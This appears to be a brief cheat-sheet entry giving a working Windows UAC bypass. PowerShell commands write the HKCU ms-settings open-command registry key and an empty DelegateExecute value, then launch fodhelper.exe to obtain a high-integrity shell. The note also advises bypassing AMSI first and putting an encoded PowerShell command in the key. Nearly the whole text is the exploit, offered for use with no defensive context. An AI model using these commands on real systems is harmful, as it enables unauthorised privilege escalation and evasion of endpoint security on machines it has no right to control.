# Exploit fodhelper registry keys to get High integrity shell.  

You can set the value of the registry key to a powershell commmand.  Powershell -encodedcommand arearear== or whatever.  


*** Of Course you have to bypass AMSI before doing registry key settings.  Once Fodhelper.exe is launched you will have high integrity shell ***

``` powershell

New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value powershell.exe –Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
C:\Windows\System32\fodhelper.exe

``` 
